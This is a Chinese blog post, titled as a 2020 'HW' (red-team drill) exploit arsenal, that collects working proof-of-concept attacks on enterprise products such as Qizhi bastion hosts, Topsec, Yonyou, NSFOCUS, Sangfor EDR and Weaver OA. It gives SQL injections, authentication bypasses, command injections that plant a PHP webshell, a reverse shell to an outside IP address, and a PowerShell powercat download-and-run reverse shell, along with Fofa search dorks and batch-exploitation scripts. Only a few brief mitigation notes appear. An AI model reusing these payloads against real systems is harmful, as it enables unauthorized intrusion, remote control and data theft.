<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>2020HW漏洞武器库 | Harbor</title><meta name="keywords" content="HW,2020"><meta name="author" content="Harbor"><meta name="copyright" content="Harbor"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="齐治堡垒机前远程命令执行漏洞（CNVD-2019-20835）1 、 访 问http:&#x2F;&#x2F;10.20.10.11&#x2F;listener&#x2F;cluster_manage.php : 返 回 “OK”.（ 未 授 权 无 需 登 录 ） 2、访问如下链接即可获得getshell，执行成功后，生成PHP一句话马 https:&#x2F;&#x2F;10.20.10.10&#x2F;ha_request.php？action&#x3D;install">
<meta property="og:type" content="article">
<meta property="og:title" content="2020HW漏洞武器库">
<meta property="og:url" content="http://harbors.vip/post/hw.html">
<meta property="og:site_name" content="Harbor">
<meta property="og:description" content="齐治堡垒机前远程命令执行漏洞（CNVD-2019-20835）1 、 访 问http:&#x2F;&#x2F;10.20.10.11&#x2F;listener&#x2F;cluster_manage.php : 返 回 “OK”.（ 未 授 权 无 需 登 录 ） 2、访问如下链接即可获得getshell，执行成功后，生成PHP一句话马 https:&#x2F;&#x2F;10.20.10.10&#x2F;ha_request.php？action&#x3D;install">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://harbors.vip/image/3.jpg">
<meta property="article:published_time" content="2020-11-16T01:19:00.000Z">
<meta property="article:modified_time" content="2020-11-16T06:07:10.161Z">
<meta property="article:author" content="Harbor">
<meta property="article:tag" content="HW">
<meta property="article:tag" content="2020">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://harbors.vip/image/3.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://harbors.vip/post/hw"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="preconnect" href="//zz.bdstatic.com"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  ClickShowText: {"text":"富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善","fontSize":"15px"},
  lightbox: 'fancybox',
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2020-11-16 14:07:10'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
   if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }
  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }const asideStatus = saveToLocal.get('aside-status')
if (asideStatus !== undefined) {
   if (asideStatus === 'hide') {
     document.documentElement.classList.add('hide-aside')
   } else {
     document.documentElement.classList.remove('hide-aside')
   }
}})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/TX.jpg" onerror="onerror=null;src='/img/404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我们</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/image/3.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Harbor</a></span><span id="menus"><div id="search_button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我们</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">2020HW漏洞武器库</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-11-16T01:19:00.000Z" title="发表于 2020-11-16 09:19:00">2020-11-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-11-16T06:07:10.161Z" title="更新于 2020-11-16 14:07:10">2020-11-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%BA%93/">漏洞库</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="齐治堡垒机前远程命令执行漏洞（CNVD-2019-20835）"><a href="#齐治堡垒机前远程命令执行漏洞（CNVD-2019-20835）" class="headerlink" title="齐治堡垒机前远程命令执行漏洞（CNVD-2019-20835）"></a>齐治堡垒机前远程命令执行漏洞（CNVD-2019-20835）</h2><p>1 、 访 问<code>http://10.20.10.11/listener/cluster_manage.php</code> : 返 回 “OK”.（ 未 授 权 无 需 登 录 ）</p>
<p>2、访问如下链接即可获得getshell，执行成功后，生成PHP一句话马</p>
<p><code>https://10.20.10.10/ha_request.php？action=install&amp;ipaddr=10.20.10.11&amp;node_id=1$&#123;IFS&#125;|echo$&#123;IFS&#125;&quot;ZWNobyAnPD9waHAgQGV2YW</code></p>
<p>3.getshell访问路径：</p>
<p><code>/var/www/shterm/resources/qrcode/lbj77.php</code><br><code>https://10.20.10.10/shterm/resources/qrcode/lbj77.php(密码10086)</code><br><img src="/image/HW/1.jpg" alt="1"><br>据说还是另外一个版本是java的:</p>
<p>POST /shterm/listener/tui_update.</p>
<p>a=[“t’;import os;os.popen(‘whoami’)#”]<br><img src="/image/HW/2.jpg" alt="1"></p>
<h2 id="天融信TopApp-LB-负载均衡系统Sql注入漏洞"><a href="#天融信TopApp-LB-负载均衡系统Sql注入漏洞" class="headerlink" title="天融信TopApp-LB 负载均衡系统Sql注入漏洞"></a>天融信TopApp-LB 负载均衡系统Sql注入漏洞</h2><p>1.利用POC:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;acc&#x2F;clsf&#x2F;report&#x2F;datasource.php HTTP&#x2F;1.1 Host: localhost</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Accept: text&#x2F;javascript, text&#x2F;html, application&#x2F;xml, text&#x2F;xml, *&#x2F;*</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.105 Safari&#x2F;537.36</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line"></span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">t&#x3D;l&amp;e&#x3D;0&amp;s&#x3D;t&amp;l&#x3D;1&amp;vid&#x3D;1+union select 1,2,3,4,5,6,7,8,9,substr(&#39;a&#39;,1,1),11,12,13,14,15,16,17,18,19,20,21,22--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/image/HW/12.jpg" alt="1"></p>
<p>2.2个历史漏洞仍然可以复现</p>
<p><code>https://www.uedbox.com/post/21626/</code></p>
<p>用户名: 随意 密码：;id（天融信负载均衡TopApp-LB系统无需密码直接登陆） </p>
<p><code>https://www.uedbox.com/post/22193/</code></p>
<p>用户名: ; ping 9928e5.dnslog.info;echo  密码：任意<br><img src="/image/HW/13.jpg" alt="1"></p>
<h2 id="用友GRP-u8-注入"><a href="#用友GRP-u8-注入" class="headerlink" title="用友GRP-u8 注入"></a>用友GRP-u8 注入</h2><p>利用POC:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;Proxy HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded User-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 6.0;) </span><br><span class="line">Host: localhost</span><br><span class="line">Content-Length: 341 </span><br><span class="line">Connection: Keep-Alive </span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line">cVer&#x3D;9.8.0&amp;dp&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;GB2312&quot;?&gt;&lt;R9PACKET version&#x3D;&quot;1&quot;&gt;&lt;DATAFORMAT&gt;XML&lt;&#x2F;DATAFORMAT&gt;</span><br><span class="line">&lt;R9FUNCTION&gt;&lt;NAME&gt;AS_DataRequest&lt;&#x2F;NAME&gt;&lt;PARAMS&gt;&lt;PARAM&gt;&lt;NAME&gt;ProviderName&lt;&#x2F;NAME&gt;&lt;DATA</span><br><span class="line">format&#x3D;&quot;text&quot;&gt;DataSetProviderData&lt;&#x2F;DATA&gt;&lt;&#x2F;PARAM&gt;&lt;PARAM&gt;&lt;NAME&gt;Data&lt;&#x2F;NAME&gt;&lt;DATA format&#x3D;&quot;text&quot;&gt;exec xp_cmdshell &#39;whoami&#39;&lt;&#x2F;DATA&gt;&lt;&#x2F;PARAM&gt;&lt;&#x2F;PARAMS&gt;&lt;&#x2F;R9FUNCTION&gt;&lt;&#x2F;R9PACKET&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/image/HW/15.jpg" alt="1"></p>
<h2 id="绿盟UTS综合威胁探针管理员任意登录"><a href="#绿盟UTS综合威胁探针管理员任意登录" class="headerlink" title="绿盟UTS综合威胁探针管理员任意登录"></a>绿盟UTS综合威胁探针管理员任意登录</h2><p>逻辑漏洞,利用方式参考：<code>https://www.hackbug.net/archives/112.htmlhttp://www.hackbug.net/archives/112.html</code> </p>
<p>1、修改登录数据包 {“status”:false,”mag”:””} -&gt; {“status”:true,”mag”:””}</p>
<p>2、/webapi/v1/system/accountmanage/account接口逻辑错误泄漏了管理员的账户信息包括密码（md5） </p>
<p>3、再次登录,替换密码上个数据包中md5密码</p>
<p>4、登录成功<br><img src="/image/HW/16.jpg" alt="1"></p>
<p>漏洞实际案例：</p>
<p><img src="/image/HW/9.jpg" alt="1"><br><img src="/image/HW/8.jpg" alt="1"><br>对响应包进行修改，将false更改为true的时候可以泄露管理用户的md5值密码<br><img src="/image%5CHW%5C7.jpg" alt="1"></p>
<p><img src="/image/HW/5.jpg" alt="1"><br><img src="/image/HW/4.jpg" alt="1"><br>利用渠道的md5值去登录页面<br><img src="/image/HW/3.jpg" alt="1"><br>7ac301836522b54afcbbed714534c7fb</p>
<p><img src="/image/HW/17.jpg" alt="1"></p>
<h2 id="天融信数据防泄漏系统越权修改管理员密码"><a href="#天融信数据防泄漏系统越权修改管理员密码" class="headerlink" title="天融信数据防泄漏系统越权修改管理员密码"></a>天融信数据防泄漏系统越权修改管理员密码</h2><p>无需登录权限,由于修改密码处未校验原密码,且/?module=auth_user&amp;action=mod_edit_pwd，接口未授权访问,造成直接修改任意用户密码，默认superman账户uid为1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?module&#x3D;auth_user&amp;action&#x3D;mod_edit_pwd </span><br><span class="line"></span><br><span class="line">Cookie: username&#x3D;superman;</span><br><span class="line"></span><br><span class="line">uid&#x3D;1&amp;pd&#x3D;Newpasswd&amp;mod_pwd&#x3D;1&amp;dlp_perm&#x3D;1</span><br></pre></td></tr></table></figure>
<p><img src="/image/HW/18.jpg" alt="1"></p>
<h2 id="WPS-Office-图片解析错误导致堆损坏，任意代码执行"><a href="#WPS-Office-图片解析错误导致堆损坏，任意代码执行" class="headerlink" title="WPS Office 图片解析错误导致堆损坏，任意代码执行"></a>WPS Office 图片解析错误导致堆损坏，任意代码执行</h2><p>相关参考:<code>http://zeifan.my/security/rce/heap/2020/09/03/wps-rce-heap.html</code></p>
<h2 id="SANGFOR终端检测响应平台-任意用户登录"><a href="#SANGFOR终端检测响应平台-任意用户登录" class="headerlink" title="SANGFOR终端检测响应平台-任意用户登录"></a>SANGFOR终端检测响应平台-任意用户登录</h2><p>fofa指纹：title=”SANGFOR终端检测响应平台” </p>
<p>漏洞利用：</p>
<p>payload：</p>
<p><code>https://ip/ui/login.php?user=需登录的用户名列</code> </p>
<p>如 ： <code>https://1.1.1.1:1980/ui/login.php?user=admin</code> </p>
<p>查询完毕以后即可登录平台。<br><img src="/image/HW/19.gif" alt="1"></p>
<h2 id="某信服EDR漏洞-包含payload"><a href="#某信服EDR漏洞-包含payload" class="headerlink" title="某信服EDR漏洞-包含payload"></a>某信服EDR漏洞-包含payload</h2><p>1.漏洞利用方法：</p>
<p><code>https://xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&amp;host=whoami</code><br><img src="/image/HW/20.jpg" alt="1"></p>
<p>2.批量利用方法</p>
<p>网上已经放出批量利用方法了，如下：<code>https://github.com/A2gel/sangfor-edr-exploit</code><br>3.使用方法单个url</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python edr.py url [http:&#x2F;&#x2F;10.10.10.10](http:&#x2F;&#x2F;10.10.10.10&#x2F;)</span><br><span class="line"></span><br><span class="line">Command&gt; whoami</span><br><span class="line"></span><br><span class="line">Try [http:&#x2F;&#x2F;10.10.10.10](http:&#x2F;&#x2F;10.10.10.10&#x2F;) root</span><br></pre></td></tr></table></figure>

<p>批量url 需要在目录下创建xxx.txt 一行一个url</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python edr.py file 1.txt whoami</span><br><span class="line"></span><br><span class="line">Try: http:&#x2F;&#x2F;10.10.10.10 root</span><br><span class="line">Try: http:&#x2F;&#x2F;10.10.10.11</span><br><span class="line">root</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="sangfor-EDR-RCE漏洞"><a href="#sangfor-EDR-RCE漏洞" class="headerlink" title="sangfor EDR RCE漏洞"></a>sangfor EDR RCE漏洞</h2><ol>
<li>漏 洞 原 理 :<br>dev_linkage_launch.php 为设备联动的新入口点主要是将联动的接口构造成业务统一处理的接口主要调用<br><img src="/image/HW/21.jpg" alt="1"></li>
</ol>
<p><img src="/image/HW/22.jpg" alt="1"><br>跟进<br><img src="/image/HW/23.jpg" alt="1"><br><br>可以看到 第一个检查为 <code>$req_url = $_SERVER[&#39;PHP_SELF&#39;];</code> </br><br>绕过第一个检查:<br><br>在他们系统nginx配置文件里面:</br><br><img src="/image/HW/24.jpg" alt="1"><br>通过nginx规则可以得知,他们没有设置禁止外网访问.从而可以直接访问<br><code>/api/edr/sangforinter/v2/xxx</code> 绕过 第一个检查<br><br>第二检查: 权限检查</br><br><img src="/image/HW/25.jpg" alt="1"><br>跟进check_access_token<br><img src="/image/HW/26.jpg" alt="1"><br>这里<code>if($md5_str == $json_token[&quot;md5&quot;])</code> 引发第二个漏洞: php弱类型导致的漏洞绕过只需要传入一个base64编码的json内容为 {“md5”:true}即可<br><br>至此 权限检查绕过完毕</br><br>来到 process_cssp.php 文件<br><img src="/image/HW/27.jpg" alt="1"><br>存在任意指令执行漏洞.作者试图使用escapeshellarg函数去给单引号打反斜杠实际上是毫无作用的. 绕过:<code>&#123;&quot;params&quot;:&quot;w=123\&quot;&#39;1234123&#39;\&quot;|命令&quot;&#125;</code></p>
<p>2.利用POC:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">post &#x2F;api&#x2F;edr&#x2F;sanforinter&#x2F;v2&#x2F;cssp&#x2F;slog_client?token&#x3D;ssskbkds HTTP&#x2F;1.1.</span><br><span class="line"></span><br><span class="line">&#123;&quot;params&quot;:&quot;w&#x3D;123\&quot;&#39;1234123&#39;\&quot;|bash -i &gt;&#x2F;dev&#x2F;tcp&#x2F;167.179.118.219&#x2F;8899 0&gt;&amp;1&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/image/HW/28.jpg" alt="1"><br>外网linux反弹监听NC端口<br>nc -lvvp 889<br><img src="/image/HW/29.jpg" alt="1"><br>深信服EDR 远程命令执行的技巧：</p>
<p><code>/api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9</code></p>
<p><code>&#123;&quot;params&quot;: &quot;w=123\&quot;&#39;1234123&#39;\&quot;|curl `whoami`.dnslog.cn&quot;&#125;</code><br><img src="/image/HW/30.jpg" alt="1"></p>
<h2 id="联软科技产品存在任意文件上传和命令执行漏洞"><a href="#联软科技产品存在任意文件上传和命令执行漏洞" class="headerlink" title="联软科技产品存在任意文件上传和命令执行漏洞"></a>联软科技产品存在任意文件上传和命令执行漏洞</h2><p>1.影响范围:</p>
<p>联软科技相关产品</p>
<p>2.漏洞描述:</p>
<p>任意文件上传漏洞，存在于用户自检报告上传时，后台使用黑名单机制对上传的文件进行过滤和限制，由于当前黑名单机制存在缺陷，文件过滤机制可以被绕过，导致存在文件上传漏洞；利用该漏洞可以获取webshell权限。</p>
<p>命令执行漏洞，存在于后台资源读取过程中，对于自动提交的用户可控参数没有进行安全检查，可以通过构造特殊参数的数据包，后台在执行过程中直接执行了提交数据包中的命令参数，导致命令执行漏洞；该漏洞能够以当前运行的中间件用户权限执行系统命令，根据中间件用户权限不同，可以进行添加系统账户，使用反弹shell等操作。</p>
<p>3.规避措施:</p>
<p>建议各单位在修补漏洞前制定详细的书面方案，方案需要包含升级、业务验证、回退等内容。升级加固操作建议在业务闲时进行操作，各单位可以分批次，采取先验证后批量修复的方式开展升级工作。如果在修复时发生异常，建议按照预先制定的应急预案进行回退，确保不影响业务的正常运行。各单位在升级后需进行相关业务验证，确保本次漏洞临时修复方案对业务零影响。</p>
<h2 id="泛微OA-Bsh-远程代码执行漏洞"><a href="#泛微OA-Bsh-远程代码执行漏洞" class="headerlink" title="泛微OA Bsh 远程代码执行漏洞"></a>泛微OA Bsh 远程代码执行漏洞</h2><p>1.漏洞简介</p>
<p>2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行, 漏洞等级严重.</p>
<p>2.影响组件： 泛微OA</p>
<p>3.漏洞指纹</p>
<p>   Set-Cookie: ecology_JSessionId=ecology/weaver/bsh.servlet.BshServlet</p>
<p>4.Fofa Dork</p>
<p>   app=”泛微-协同办公OA”</p>
<p>5.漏洞分析</p>
<p>   <code>[https://www.freebuf.com/vuls/215218.html]</code></p>
<p>   <code>https://github.com/beanshell/beanshell</code>    </p>
<p>   <code>http://beanshell.org/manual/quickstart.html#The_BeanShell_GUI</code></p>
<p>6.漏洞利用利用POC:</p>
<pre><code> POST /weaver/bsh.servlet.BshServlet HTTP/1.1 Host: xxxxxxxx:8088

 Accept: */*

 Accept-Language: en

 User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64;    Trident/5.0) Connection: close

 Content-Length: 98

 Content-Type: application/x-www-form-urlencoded



 bsh.script=eval%00(&quot;ex&quot;%2b&quot;ec(\&quot;whoami\&quot;)&quot;);&amp;bsh.servlet.captureOutErr=true&amp;b sh.servlet.output=raw</code></pre>
<p>   CNVD-2019-32204利用脚本：</p>
<p>   <code>https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204</code></p>
<p>   批量脚本执行：</p>
<pre><code> pip install requests

 python Weaver-Ecology-OA_RCE-exp.py</code></pre>
<p>   url.txt文件中 是url地址 需要带http协议</p>
<p>7.利用技巧</p>
<p>其他形式绕过</p>
<p>eval%00(“ex”%2b”ec(&quot;whoami&quot;)”); 也可以换成 ex\u0065c(“cmd /c dir”); </p>
<p>;泛微多数都是windows环境, 反弹shell可以使用pcat</p>
<p>;Powershell </p>
<p>;IEX(New-Object</p>
<p>   &nbsp;System.Net.Webclient).DownloadString(‘<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);pow">https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);pow</a></p>
<p>;ercat -c ip -p 6666 -e cmd</p>
<p>8.防护方法     </p>
<p>1.及时更新泛微补丁</p>
<p>2.拦截/weaver/bsh.servlet.BshServlet目录的访问</p>
<h2 id="泛微OA-e-cology-SQL注入漏洞"><a href="#泛微OA-e-cology-SQL注入漏洞" class="headerlink" title="泛微OA e-cology SQL注入漏洞"></a>泛微OA e-cology SQL注入漏洞</h2><p>1.漏洞简介</p>
<p>泛微OA在国内的用户很多,漏洞以前也很多,但现在在漏洞盒子托管了企业SRC： <a target="_blank" rel="noopener" href="https://weaversrc.vulbox.com/">https://weaversrc.vulbox.com/</a>, 情况有所好转</p>
<p>2.影响组件泛微OA</p>
<p>3.漏洞指纹</p>
<p><code>Set-Cookie: ecology_JSessionId= ecology WorkflowCenterTreeData</code></p>
<p><code>/mobile/plugin/SyncUserInfo.jsp</code></p>
<p>4.Fofa Dork</p>
<p>app=”泛微-协同办公OA”</p>
<p>5.漏洞分析</p>
<p>泛微OA WorkflowCenterTreeData接口注入漏洞(限oracle数据库) – 先知社区<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6531">https://xz.aliyun.com/t/6531</a></p>
<p>6.漏洞利用</p>
<p>泛微OA e-cology WorkflowCenterTreeData前台接口SQL注入漏洞复现： 修改NULL后为要查询的字段名,修改from后为查询的表：</p>
<pre><code> POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&amp;scope=2333 HTTP/1.1

 Host: ip:port

 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate

 Content-Type: application/x-www-form-urlencoded Content-Length: 2236

 Connection: close

 Upgrade-Insecure-Requests: 1

 formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0 d%0a%0d%0a%0</code></pre>
<p><img src="/image/HW/31.jpg" alt="1"><br><code>https://github.com/orleven/Tentacle/blob/6e1cecd52b10526c4851a26249339367101b3ca2/script/ecology/ecology8_mobile_sql _inject.py</code><br><br>应用安全 – 软件漏洞 – 泛微OA漏洞汇总：</br><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30855099/article/details/101191532">https://blog.csdn.net/weixin_30855099/article/details/101191532</a><br>/mobile/plugin/SyncUserInfo.jsp 这个也是有问题的, 但由于没有公开的分析报告, 漏洞相对简单, 这里不过多描述<br><br>7.利用技巧</br>                                                                                           <br>1.在这个漏洞补丁之前大概有几十个前台注入, 都差不多, 因为没公开这里就不细说了</br></p>
<p>2.泛微的补丁中间改过一次过滤策略, 打完所有补丁的话, 注入就很难了</p>
<p>3.这里可以绕过的原因是泛微某个过滤器初始化错误,当长度超过xssMaxLength=500的时候就不进入安全检测, 修复以后是xssMaxLength=1000000,所以随便你填充%0a%0d还是空格都可以绕过注入检测</p>
<p>4.泛微后端数据库版本存在差异, 但是可以通用检测。已知泛微OA E8存在2个版本的数据库, 一个是mssql, 一个是oracle, 且新旧版本泛微的sql过滤方法并不一致所以这里筛选出一个相对通用的检测手法(下面代码是python的” “<em>800 800个空格)<br><br>“-1) “+” “<em>800+ “union select/</em></em>/1, Null, Null, Null, Null, Null, Null, Null from Hrmresourcemanager where loginid=(‘sysadmin’”</br></p>
